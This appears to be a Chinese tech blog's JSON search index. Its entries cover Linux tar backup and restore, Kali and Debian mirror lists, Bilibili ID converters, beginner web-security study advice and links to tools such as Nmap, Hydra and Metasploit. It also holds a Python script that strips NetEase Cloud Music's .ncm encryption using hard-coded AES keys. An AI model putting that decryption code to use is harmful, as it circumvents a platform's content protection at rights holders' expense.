[{"categories":["系统"],"content":"在 使用Ubuntu之前，相信很多人都有过使用Windows系统的经历。如果你备份过Windows系统，那么你一定记忆犹新：首先需要找到一个备份工 具(通常都是私有软件)，然后重启电脑进入备份工具提供的软件环境，在这里备份或者恢复Windows系统。Norton Ghost是备份Windows系统时经常使用的备份工具。 在备份Windows系统的时候你可能想过，我能不能把整个C盘都放到一个ZIP文件里去呢。这在Windows下是不可能的，因为在Windows中有很多文件在它们运行时是不允许拷贝或覆盖的，因此你需要专门的备份工具对Windows系统进行特殊处理。 和 备份Windows系统不同，如果你要备份Ubuntu系统(或者其它任何Linux系统)，你不再需要像Ghost这类备份工具。事实上，Ghost 这类备份工具对于Linux文件系统的支持很糟糕，例如一些Ghost版本只能完善地支持Ext2文件系统，如果你用它来备份Ext3文件系统，你可能会 丢失一些宝贵的数据。 ","date":"2021-06-01","objectID":"/20210601/:0:0","tags":["Linux"],"title":"Linux系统备份与还原","uri":"/20210601/"},{"categories":["系统"],"content":"1. 备份系统 我该如何备份我的Ubuntu系统呢？很简单，就像你备份或压缩其它东西一样，使用TAR。和Windows不同，Linux不会限制root访问任何东西，你可以把分区上的所有东西都扔到一个TAR文件里去！ 首先成为root用户： sudo su 然后进入文件系统的根目录(当然，如果你不想备份整个文件系统，你也可以进入你想要备份的目录，包括远程目录或者移动硬盘上的目录)： cd / 下面是我用来备份系统的完整命令： tar cvpzf backup.tgz –exclude=/proc –exclude=/lost+found –exclude=/backup.tgz –exclude=/mnt –exclude=/sys / 让我们来简单看一下这个命令： “tar”当然就是我们备份系统所使用的程序了。 “cvpfz”是tar的选项，意思是“创建档案文件”、“保持权限”(保留所有东西原来的权限)、“使用gzip来减小文件尺寸”。 “backup.gz”是我们将要得到的档案文件的文件名。 “/”是我们要备份的目录，在这里是整个文件系统。 在 档案文件名“backup.gz”和要备份的目录名“/”之间给出了备份时必须排除在外的目录。有些目录是无用的，例如“/proc”、“/lost+ found”、“/sys”。当然，“backup.gz”这个档案文件本身必须排除在外，否则你可能会得到一些超出常理的结果。如果不把“/mnt”排 除在外，那么挂载在“/mnt”上的其它分区也会被备份。另外需要确认一下“/media”上没有挂载任何东西(例如光盘、移动硬盘)，如果有挂载东西， 必须把“/media”也排除在外。 有人可能会建议你把“/dev”目录排除在外，但是我认为这样做很不妥，具体原因这里就不讨论了。 执行备份命令之前请再确认一下你所键入的命令是不是你想要的。执行备份命令可能需要一段不短的时间。 备份完成后，在文件系统的根目录将生成一个名为“backup.tgz”的文件，它的尺寸有可能非常大。现在你可以把它烧录到DVD上或者放到你认为安全的地方去。 在备份命令结束时你可能会看到这样一个提示：’tar: Error exit delayed from previous errors’，多数情况下你可以忽略它。 你还可以用Bzip2来压缩文件，Bzip2比gzip的压缩率高，但是速度慢一些。如果压缩率对你来说很重要，那么你应该使用Bzip2，用“j”代替命令中的“z”，并且给档案文件一个正确的扩展名“bz2”。完整的命令如下： tar cvpjf backup.tar.bz2 –exclude=/proc –exclude=/lost+found –exclude=/backup.tar.bz2 –exclude=/mnt –exclude=/sys / ","date":"2021-06-01","objectID":"/20210601/:1:0","tags":["Linux"],"title":"Linux系统备份与还原","uri":"/20210601/"},{"categories":["系统"],"content":"2. 恢复系统 在进行恢复系统的操作时一定要小心！如果你不清楚自己在做什么，那么你有可能把重要的数据弄丢，请务必小心！ 接着上面的例子。切换到root用户，并把文件“backup.tgz”拷贝到分区的根目录下。 在 Linux中有一件很美妙的事情，就是你可以在一个运行的系统中恢复系统，而不需要用boot-cd来专门引导。当然，如果你的系统已经挂掉不能启动了， 你可以用Live CD来启动，效果是一样的。你还可以用一个命令把Linux系统中的所有文件干掉，当然在这里我不打算给出这个命令！ 使用下面的命令来恢复系统： tar xvpfz backup.tgz -C / 如果你的档案文件是使用Bzip2压缩的，应该用： tar xvpfj backup.tar.bz2 -C / 注意：上面的命令会用档案文件中的文件覆盖分区上的所有文件。 执行恢复命令之前请再确认一下你所键入的命令是不是你想要的，执行恢复命令可能需要一段不短的时间。 恢复命令结束时，你的工作还没完成，别忘了重新创建那些在备份时被排除在外的目录： mkdir proc mkdir lost+found mkdir mnt mkdir sys 当你重启电脑，你会发现一切东西恢复到你创建备份时的样子了！ ","date":"2021-06-01","objectID":"/20210601/:2:0","tags":["Linux"],"title":"Linux系统备份与还原","uri":"/20210601/"},{"categories":["系统"],"content":"打开配置文件 vim /etc/apt/sources.list ","date":"2021-05-01","objectID":"/20210501/:1:0","tags":["Kali"],"title":"kali 修改为国内源","uri":"/20210501/"},{"categories":["系统"],"content":"kali源 #中科大 deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib #阿里云 deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib #清华大学 deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free #浙大 deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free #东软大学 deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib #官方源 deb http://http.kali.org/kali kali-rolling main non-free contrib deb-src http://http.kali.org/kali kali-rolling main non-free contrib ","date":"2021-05-01","objectID":"/20210501/:2:0","tags":["Kali"],"title":"kali 修改为国内源","uri":"/20210501/"},{"categories":["系统"],"content":"debian源 # 中科大源 deb http://mirrors.ustc.edu.cn/debian buster main contrib non-free deb http://mirrors.ustc.edu.cn/debian buster-updates main contrib non-free deb http://mirrors.ustc.edu.cn/debian buster-backports main contrib non-free deb http://mirrors.ustc.edu.cn/debian-security/ buster/updates main contrib non-free #deb-src http://mirrors.ustc.edu.cn/debian buster main contrib non-free #deb-src http://mirrors.ustc.edu.cn/debian buster-updates main contrib non-free #deb-src http://mirrors.ustc.edu.cn/debian buster-backports main contrib non-free #deb-src http://mirrors.ustc.edu.cn/debian-security/ buster/updates main contrib non-free # 阿里云 deb http://mirrors.aliyun.com/debian/ buster main non-free contrib deb http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib deb http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib deb http://mirrors.aliyun.com/debian-security buster/updates main #deb-src http://mirrors.aliyun.com/debian/ buster main non-free contrib #deb-src http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib #deb-src http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib #deb-src http://mirrors.aliyun.com/debian-security buster/updates main # 网易源 deb http://mirrors.163.com/debian/ buster main non-free contrib deb http://mirrors.163.com/debian/ buster-updates main non-free contrib deb http://mirrors.163.com/debian/ buster-backports main non-free contrib deb http://mirrors.163.com/debian-security/ buster/updates main non-free contrib #deb-src http://mirrors.163.com/debian/ buster main non-free contrib #deb-src http://mirrors.163.com/debian/ buster-updates main non-free contrib #deb-src http://mirrors.163.com/debian/ buster-backports main non-free contrib #deb-src http://mirrors.163.com/debian-security/ buster/updates main non-free contrib # 官方源 deb http://deb.debian.org/debian buster main contrib non-free deb http://deb.debian.org/debian buster-updates main contrib non-free deb http://deb.debian.org/debian-security/ buster/updates main contrib non-free #deb-src http://deb.debian.org/debian buster main contrib non-free #deb-src http://deb.debian.org/debian buster-updates main contrib non-free #deb-src http://deb.debian.org/debian-security/ buster/updates main contrib non-free ","date":"2021-05-01","objectID":"/20210501/:3:0","tags":["Kali"],"title":"kali 修改为国内源","uri":"/20210501/"},{"categories":["系统"],"content":"更新软件列表并更新软件 sudo apt update \u0026\u0026 sudo apt upgrade -y ","date":"2021-05-01","objectID":"/20210501/:4:0","tags":["Kali"],"title":"kali 修改为国内源","uri":"/20210501/"},{"categories":["教程"],"content":" 网易云音乐把.mp3音乐文件加密为.ncm文件，导致不能将下载好的音乐复制到其它设备，或使用非网易云音乐播放器播放，该程序可将.ncm文件逆向解密为.mp3文件，并保留原始音质。 # 依赖pycrypto库 import binascii import struct import base64 import json import os from Crypto.Cipher import AES def dump(file_path): core_key = binascii.a2b_hex(\"687A4852416D736F356B496E62617857\") meta_key = binascii.a2b_hex(\"2331346C6A6B5F215C5D2630553C2728\") unpad = lambda s : s[0:-(s[-1] if type(s[-1]) == int else ord(s[-1]))] f = open(file_path,'rb') header = f.read(8) assert binascii.b2a_hex(header) == b'4354454e4644414d' f.seek(2, 1) key_length = f.read(4) key_length = struct.unpack('\u003cI', bytes(key_length))[0] key_data = f.read(key_length) key_data_array = bytearray(key_data) for i in range (0,len(key_data_array)): key_data_array[i] ^= 0x64 key_data = bytes(key_data_array) cryptor = AES.new(core_key, AES.MODE_ECB) key_data = unpad(cryptor.decrypt(key_data))[17:] key_length = len(key_data) key_data = bytearray(key_data) key_box = bytearray(range(256)) c = 0 last_byte = 0 key_offset = 0 for i in range(256): swap = key_box[i] c = (swap + last_byte + key_data[key_offset]) \u0026 0xff key_offset += 1 if key_offset \u003e= key_length: key_offset = 0 key_box[i] = key_box[c] key_box[c] = swap last_byte = c meta_length = f.read(4) meta_length = struct.unpack('\u003cI', bytes(meta_length))[0] meta_data = f.read(meta_length) meta_data_array = bytearray(meta_data) for i in range(0,len(meta_data_array)): meta_data_array[i] ^= 0x63 meta_data = bytes(meta_data_array) meta_data = base64.b64decode(meta_data[22:]) cryptor = AES.new(meta_key, AES.MODE_ECB) meta_data = unpad(cryptor.decrypt(meta_data)).decode('utf-8')[6:] meta_data = json.loads(meta_data) crc32 = f.read(4) crc32 = struct.unpack('\u003cI', bytes(crc32))[0] f.seek(5, 1) image_size = f.read(4) image_size = struct.unpack('\u003cI', bytes(image_size))[0] image_data = f.read(image_size) file_name = meta_data['musicName'] + '.' + meta_data['format'] m = open(os.path.join(os.path.split(file_path)[0],file_name),'wb') chunk = bytearray() while True: chunk = bytearray(f.read(0x8000)) chunk_length = len(chunk) if not chunk: break for i in range(1,chunk_length+1): j = i \u0026 0xff; chunk[i-1] ^= key_box[(key_box[j] + key_box[(key_box[j] + j) \u0026 0xff]) \u0026 0xff] m.write(chunk) m.close() f.close() if __name__ == '__main__': import sys if len(sys.argv) \u003e 1: for file_path in sys.argv[1:]: try: dump(file_path) except: pass else: print(\"Usage: python ncmdump.py \\\"File Name\\\"\") ","date":"2021-04-01","objectID":"/20210401/:0:0","tags":["Python"],"title":"论如何使用Python解密ncm文件","uri":"/20210401/"},{"categories":["教程"],"content":"AV号BV号互相转换脚本 class Bilibili { protected $tr = \"fZodR9XQDSUm21yCkr6zBqiveYah8bt4xsWpHnJE7jL5VG3guMTKNPAwcF\"; protected $xor = 177451812; protected $add = 8728348608; protected $s = [11, 10, 3, 8, 4, 6]; // BV 转 AV public function dec($bv) { $r = 0; $tr = array_flip(str_split($this-\u003etr)); for ($i = 0; $i \u003c 6; $i++) { $r += $tr[$bv[$this-\u003es[$i]]] * (pow(58, $i)); } return ($r - $this-\u003eadd) ^ $this-\u003exor; } // AV 转 BV public function enc($av) { $tr = str_split($this-\u003etr); $bv = 'BV1 4 1 7 '; $av = ($av ^ $this-\u003exor) + $this-\u003eadd; for ($i = 0; $i \u003c 6; $i++) { $bv[$this-\u003es[$i]] = $tr[floor($av/pow(58,$i)%58)]; } return $bv; } } // 调用 $str = new Bilibili(); echo $str-\u003edec('BV17x411w7KC'); // 输出: 170001 echo $str-\u003eenc(170001); // 输出: BV17x411w7KC table='fZodR9XQDSUm21yCkr6zBqiveYah8bt4xsWpHnJE7jL5VG3guMTKNPAwcF' tr={} for i in range(58): tr[table[i]]=i s=[11,10,3,8,4,6] xor=177451812 add=8728348608 def dec(x): r=0 for i in range(6): r+=tr[x[s[i]]]*58**i return (r-add)^xor def enc(x): x=(x^xor)+add r=list('BV1 4 1 7 ') for i in range(6): r[s[i]]=table[x//58**i%58] return ''.join(r) print(dec('BV17x411w7KC')) print(dec('BV1Q541167Qg')) print(dec('BV1mK4y1C7Bz')) print(enc(170001)) print(enc(455017605)) print(enc(882584971)) ","date":"2021-03-01","objectID":"/20210301/:0:0","tags":["PHP"],"title":"Bilibili AV号BV号互相转换脚本","uri":"/20210301/"},{"categories":["安全入门"],"content":"表弟大一刚结束，学的是计算机相关的专业，上学期开始学安全相关的技术，我就给他买了一套云课堂的 《Web安全工程师微专业》 课程，结果这货学到第一课的时候，因为错过章节考试时间直接没及格……好在后边几课都按部就班的学习了，然后应该是6月份开始试着在 教育行业SRC 挖掘漏洞，到现在也只是发现了几个XSS、敏感文件泄露之类的小漏洞，和他同期学习课程的一些同学已经挖了很多了排名很靠前，还有在企业SRC挖洞的，看看别人家的表弟…之前表弟要准备课程的期末考试之类的，现在放暑假了，我就建议说可以再好好学习那套课程，趁着暑假，多实践。然后就讨论到 有没有适合入门阶段学习的Web安全书籍 这个问题。 说到Web安全书籍，这几年其实是一种百家齐放的状态，不断有优秀的书籍出版，那这里就尽可能少地整理几本我阅读过的Web安全入门书籍作为推荐。 如果没学过相关课程的小伙伴，真的从0基础开始的话，还是需要先掌握一些基本的技能： 学习 网站构建初级教程_W3C 以及 HTTP协议基础-runoob 上了解Web前后端以及HTTP协议的一些基础介绍，花半天时间对相关技术有个概念性的了解就够了。 Windows下下载 phpStudy 或者 WAMP ，在本地搭建Web服务器环境，然后自己搜索两篇文章学习下基本的操作方法。这个本地Web服务器也就相当于学习过程中的一个实验环境了。 学习浏览器的开发者工具（通常快捷键F12调出），搜索一些教学文章，掌握Chrome或者Firefox浏览器开发者工具中的Network、Elements功能的常见用法，可以查看HTTP数据包以及定位页面元素。 0x01 给表弟的Web安全入门建议 ","date":"2021-02-01","objectID":"/20210201/:0:0","tags":["技能"],"title":"给表弟的Web安全入门建议","uri":"/20210201/"},{"categories":["安全入门"],"content":"适合初学者的Web安全书籍 《白帽子讲Web安全》 道哥出品，很多人的Web安全启蒙书。 《Web前端黑客技术揭秘》 前端黑客技术，余弦的作品。 对于读书，我觉得读书的目的是：学以致用。应该把注意力放在如何应用读到的知识，提高自己的技术，而不是学了多少内容。 一年哪怕只学习了一本书，也要让这本书的内容结结实实地提升自己的技能，而不是只为了多一点谈资或者阅读清单上多一个数目。这也是我这里只推荐了两本书的原因，因为我觉得这两本书，能够认真学习完，并且实践书中的案例和技能，已经很难得了，同时相比于简单翻一遍，要多花费很多的时间和精力。 ","date":"2021-02-01","objectID":"/20210201/:1:0","tags":["技能"],"title":"给表弟的Web安全入门建议","uri":"/20210201/"},{"categories":["安全入门"],"content":"工具与实战 那学习Web安全呢，同时还要掌握一些工具：浏览器开发者工具与浏览器插件（如HackBar、ProxySwitcher）、抓包工具如Burpsuite、漏洞扫描和验证工具如御剑、sqlmap、AWVS，工具可以在 Freebuf上自行搜索下载，教程可以参考Web安全-i春秋系列教程中对应这几款工具的章节学习。 好的工具可以帮助我们提高测试效率，扩展测试思路。除了工具的使用，通过搭建本地实战环境练习手工技巧，也是很好的进阶之路，这里建议可以搭建 DVWA漏洞测试环境，然后参考 DVWA系列教程_Freebuf进行学习。 学习的同时也可以在在教育行业SRC等漏洞平台上挖掘漏洞，赢得认可，也是一种动力，但挖掘漏洞的时候一定要注意规范和界限，可以参考自律方能自由，《网络安全法》实施后的白帽子行为参考，挖掘漏洞的同时也要注意保护自己。 ","date":"2021-02-01","objectID":"/20210201/:2:0","tags":["技能"],"title":"给表弟的Web安全入门建议","uri":"/20210201/"},{"categories":["安全入门"],"content":"适合初学者的社区和资讯站点 网站安全_i春秋社区 i春秋社区聚集了很多的人气，有好多学生，也很活跃，入门和进阶的文章都有，可以多多交流。 Freebuf 很多科普和梳理性的文章，也经常会有时下的热点讨论。 ","date":"2021-02-01","objectID":"/20210201/:3:0","tags":["技能"],"title":"给表弟的Web安全入门建议","uri":"/20210201/"},{"categories":["安全入门"],"content":"大学在校生可以关注的一些比赛 全国大学生信息安全竞赛 这个和全国大学生电子设计竞赛信息安全技术专题邀请赛一样，都是做一个安全软硬件系统来解决一些安全问题，通常有项目文档提交、源代码提交、现场演示答辩等几个步骤，分为初赛复赛，全国大学生信息安全竞赛为每年一次，全国大学生电子设计竞赛信息安全技术专题邀请赛通常两年一次，这两个比赛获奖对于大学生都有竞赛加分，在锻炼自己的同时，对评奖学金和保研也有帮助。 全国大学生信息安全竞赛创新实践能力线上赛（CTF形式） 这个是和i春秋合作的线上赛，和线下赛目前看来还没什么关联，CTF性质的。每年的CTF比赛很多，大家可以关注i春秋等一些站点的资讯就行了，大学生组队参加CTF比赛的挺多，也是很好的锻炼方式。 ","date":"2021-02-01","objectID":"/20210201/:4:0","tags":["技能"],"title":"给表弟的Web安全入门建议","uri":"/20210201/"},{"categories":["安全入门"],"content":"挖洞、博客与团队 既然是入门了，建议就可以随着学习的深入，在一些SRC平台上挖掘漏洞，如果你不太喜欢走这个路线，也可以整理自己的学习过程，写一些技术博客进行分享，俗话说来“你挖洞来我拍砖”，都可以，而且一些平台如Freebuf、先知社区都有付费文章奖励计划，这两种都可以在学习技术的同时获取到一些物质上的奖励，如果你慢慢有了一些编程能力（Python、Web前后端等），除了让自己的安全技术自动化之外，还可以再Github等平台分享一些开源项目。相关的SRC站点我随后再说。 关于写博客，如果自己搭建站点的话，可以考虑使用hexo+github搭建免费个人博客，或者租用一台VPS部署Wordpress博客程序。其实我觉得，初学的话，可以不在站点搭建上浪费时间，在一些比较优质的博客平台上注册一个帐号即可，也可以有自己的个性域名。如oschina、博客园、简书。写博客本身就是对自己知识技能的巩固和梳理，不要怕写不好，博客就当是给自己看的。 有一个点要提示一下，既然想走安全这条路，那么给自己想一个个性的ID（昵称），提交漏洞或者注册博客时都用这个，好好维护，当做自己的个人品牌认真经营，随着你的贡献和分享越来越多，你的ID会被越来越多的人了解和认可。 积累的过程中，如果恰好遇到几个志同道合的小伙伴，那就组个小团队吧，平时技术切磋交流，或者组团挖洞，打CTF等都是极好的。也可以主动去搜寻，或者申请加入一些公开招新的安全团队。一个人有时候可以走的更快，但一个团队往往可以走的更远。 ","date":"2021-02-01","objectID":"/20210201/:5:0","tags":["技能"],"title":"给表弟的Web安全入门建议","uri":"/20210201/"},{"categories":["安全入门"],"content":"一些进阶的书籍和资源推荐 这部分内容按需选择即可，等你入门了之后，有了一定的技术和经验，你已经足够去规划自己的发展了。 《HTTP权威指南》 平时可以当做词典来翻阅。 《黑客攻防技术宝典 Web实战篇》 深入剖析Web安全技术。 《黑客秘笈 渗透测试实用指南》 可以在虚拟机VMware中，下载运行kali Linux的VM版本进行学习和实践。 编程技术相关的书籍和教程，W3C、菜鸟教程runoob 和现代魔法学院已经能解决很多问题了，然后语言相关的官方文档都可以当做词典来查，如果想找本书系统学习的话，这里推荐下Python、PHP和Web前端的书。 《Python核心编程》 《PHP和MySQL Web开发》 《Head First HTML与CSS》 《JavaScript高级程序设计》 站点可以浏览下 安全圈info 与 SecWiki ，前者是一个持续更新的安全圈站点导航，总能找到你想要的网站，之前说的SRC站点这里都有，后者是一个安全资讯的收录分享平台，有什么安全问题可以搜索一些历史文章看看。 0x02 聊聊“学习”与“实践” ","date":"2021-02-01","objectID":"/20210201/:6:0","tags":["技能"],"title":"给表弟的Web安全入门建议","uri":"/20210201/"},{"categories":["安全入门"],"content":"入门与进阶 对于初学者来说，找一个靠谱的教程或者老师，帮助自己快速入门是非常有必要的。入门之后，虽然高手的点拨也很重要，但更多的功课其实是需要你自己来做的。这也是为什么优秀的入门教程很多，但是优质的进阶版本教程却不多。 有一句话叫“付费就是占便宜”，对于新手来说，入门阶段花一点钱买一套优质的课程，让有经验的内行带着自己学习，往往是最优的选择。还有一句话叫“免费的就是最贵的”，免费的教学资源，质量参差不齐难以保证，不用花钱，但耗费的是你筛选的精力和时间。自己根据条件取舍，现在已经逐渐进入了一种知识付费的时代，这就是我给表弟买了一套云课堂的《Web安全工程师微专业》课程作为入门学习的原因，一套优质的网课，相比于昂贵的线下班性价比很不错。 ","date":"2021-02-01","objectID":"/20210201/:7:0","tags":["技能"],"title":"给表弟的Web安全入门建议","uri":"/20210201/"},{"categories":["安全入门"],"content":"等准备好了再“实践”？ 李笑来老师有一个观点，学习任何一个学科的时候，都有一个概念很重要： 最少必要知识 MAKE : Minimal Actionable Knowledge and Experience 就是说，当我们在学习某项技能的时候，就要用最快的时间摸索清楚最少必要知识 （MAKE） 都有哪些？ 然后迅速地掌握它们，这样就实现了“快速入门”，然后就可以开始动手实践，然后在实践中印证理论、加深理解，同时继续扩展学习。 同样的时间，一个用来等待，另一个用来践行，两者的差距可能是天壤之别。你要知道没有任何考试是在你准备充分了才开始的。 有些人喜欢等待，等到合适的时机出现的时候，再采取行动。另一些人则喜欢边做边想，有不足的地方就改进，有新的问题就解决。 一段时间过去之后，后者可能已经前进了很长一段路程，而前者多半还在等待一个“恰当的时机”。 我原来就有这个问题，老想着先体系化学完某门技术…结果就是坚持不实践，过了很久还是啥都不会，反而之前看的那些知识因为没实践过也都忘了。 用和学，用比学重要。用时比学时重要。“用时”是一个很好的概念。 很多人说自己“学”了那么多年英语，但现在依然说不出，听不懂。其实他们就是在用“学时”代替“用时”来计算自己的付出的。 我们总说有效学习，其实衡量有效学习最好的方式就是：计算使用的时间。在安全技术学习上，就是：实践的时间。 ","date":"2021-02-01","objectID":"/20210201/:8:0","tags":["技能"],"title":"给表弟的Web安全入门建议","uri":"/20210201/"},{"categories":["安全入门"],"content":"从“想到”、“学到” 到 “做到” “用”比“学”重要；“做”比“想”重要；边做边想，比单纯想想不知道好多少倍。只有做到了才是掌握了。“人至‘践’则无敌”。 只要你开始做，高估或低估的困难就不仅仅是一个估计，而是一个摆在面前需要解决的现实问题。你对于它的理解不会再飘忽不定，而会变得非常具体。 很多人在做得不好的时候，总是喜欢退缩回原来的舒适区，认为是由于自己的基础还不好所以才这么不顺利，而忘记了这些践行过程中的困难，才是真正帮他们打牢基础的过程。 0x03 结语 很多人梦想找到一个牛逼的师父，几天速成然后笑傲江湖。可是每一个真正练就一身武艺的人都是靠冬练三九夏练三伏这么过来的，他们靠着一种忘我的热情持续投入进去磨练，数年如一日，最终自己也不知道怎么就发现具备了无坚不摧的实力。 同样，就算是要开好挖掘机，或着当一个好厨师，也要在自己的技能树上，一步一步地积累技能点，把过路点都点满了，才能点出大招。 我们从小到大往往会听到长辈们的建议：“戒骄戒躁”。虽然“戒骄”放在前面，但“戒骄”其实是有了一定成绩之后的事情。对大多数人来说，首先要“戒躁”，才有机会“戒骄”。 一个人能获得的最可贵的能力，都和掌握一门语言一样，你所付出的努力不是能够获得即时回馈的，甚至在很长的一段时间内没有任何收获，直到积累到了一定的阶段后，忽然爆发出惊人的力量，连你自己都不清楚这一切是如何发生的。比如锻炼身体，读书写作。当你经历了足够的量变终于引起质变时拥有的技能，大部分人是终身难以企及的，不是因为他们太笨，恰恰相反，因为他们都太聪明了。选择一个正确的方向，对那些无法立即获得回报的事情，依然能付出十年如一日的专注和热情，最终的结果也许不足以让你独孤求败，但足以出类拔萃。 祝表弟早日成为表哥，然后带带我~ ","date":"2021-02-01","objectID":"/20210201/:9:0","tags":["技能"],"title":"给表弟的Web安全入门建议","uri":"/20210201/"},{"categories":["安全入门"],"content":"本文相关链接资源整理： 《白帽子讲Web安全》 《Web前端黑客技术揭秘》 《HTTP权威指南》 《黑客攻防技术宝典 Web实战篇》 《黑客秘笈 渗透测试实用指南》 《Python核心编程》 《PHP和MySQL Web开发》 《Head First HTML与CSS》 《JavaScript高级程序设计》 W3C 菜鸟教程runoob 现代魔法学院 网站构建初级教程_W3C； HTTP协议基础-runoob； phpStudy ； WAMP； Freebuf； Web安全-i春秋； DVWA； DVWA系列教程_Freebuf； 教育行业SRC； 自律方能自由，《网络安全法》实施后的白帽子行为参考； 网站安全_i春秋社区； 全国大学生信息安全竞赛； 全国大学生信息安全竞赛创新实践能力线上赛（CTF形式）； oschina； 博客园； 简书； 安全圈info； SecWiki； 《Web安全工程师微专业》 《Web安全工程师微专业》进阶版 ","date":"2021-02-01","objectID":"/20210201/:10:0","tags":["技能"],"title":"给表弟的Web安全入门建议","uri":"/20210201/"},{"categories":["安全入门"],"content":"HTTP ","date":"2021-01-01","objectID":"/20210101/:1:0","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"BurpSuite ","date":"2021-01-01","objectID":"/20210101/:1:1","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"https://portswigger.net/burp/ ","date":"2021-01-01","objectID":"/20210101/:1:2","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"很多时候，免费版本已经满足需求 ","date":"2021-01-01","objectID":"/20210101/:1:3","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"Fiddler ","date":"2021-01-01","objectID":"/20210101/:1:4","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"http://www.telerik.com/fiddler ","date":"2021-01-01","objectID":"/20210101/:1:5","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"Firefox ","date":"2021-01-01","objectID":"/20210101/:1:6","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"Firebug ","date":"2021-01-01","objectID":"/20210101/:1:7","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"NoScript ","date":"2021-01-01","objectID":"/20210101/:1:8","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"Chrome ","date":"2021-01-01","objectID":"/20210101/:1:9","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"F12 ","date":"2021-01-01","objectID":"/20210101/:1:10","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"WhatWeb ","date":"2021-01-01","objectID":"/20210101/:1:11","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"https://github.com/urbanadventurer/whatweb ","date":"2021-01-01","objectID":"/20210101/:1:12","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"w3af ","date":"2021-01-01","objectID":"/20210101/:1:13","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"https://github.com/andresriancho/w3af ","date":"2021-01-01","objectID":"/20210101/:1:14","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"sqlmap ","date":"2021-01-01","objectID":"/20210101/:1:15","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"https://github.com/sqlmapproject/sqlmap ","date":"2021-01-01","objectID":"/20210101/:1:16","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"XSS’OR ","date":"2021-01-01","objectID":"/20210101/:1:17","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"http://xssor.io/ ","date":"2021-01-01","objectID":"/20210101/:1:18","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"各种协议 ","date":"2021-01-01","objectID":"/20210101/:2:0","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"端口扫描 ","date":"2021-01-01","objectID":"/20210101/:2:1","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"Nmap ","date":"2021-01-01","objectID":"/20210101/:2:2","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"https://nmap.org/ ","date":"2021-01-01","objectID":"/20210101/:2:3","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"https://highon.coffee/blog/nmap-cheat-sheet/ ","date":"2021-01-01","objectID":"/20210101/:2:4","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"Zmap ","date":"2021-01-01","objectID":"/20210101/:2:5","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"https://www.zmap.io/ ","date":"2021-01-01","objectID":"/20210101/:2:6","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"masscan ","date":"2021-01-01","objectID":"/20210101/:2:7","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"https://github.com/robertdavidgraham/masscan ","date":"2021-01-01","objectID":"/20210101/:2:8","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"https://github.com/offensive-security/masscan-web-ui ","date":"2021-01-01","objectID":"/20210101/:2:9","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"Hydra ","date":"2021-01-01","objectID":"/20210101/:2:10","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"https://www.thc.org/thc-hydra/ ","date":"2021-01-01","objectID":"/20210101/:2:11","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"Metasploit ","date":"2021-01-01","objectID":"/20210101/:2:12","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"https://www.metasploit.com/ ","date":"2021-01-01","objectID":"/20210101/:2:13","tags":["技能"],"title":"安全技能书简版","uri":"/20210101/"},{"categories":["安全入门"],"content":"https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers 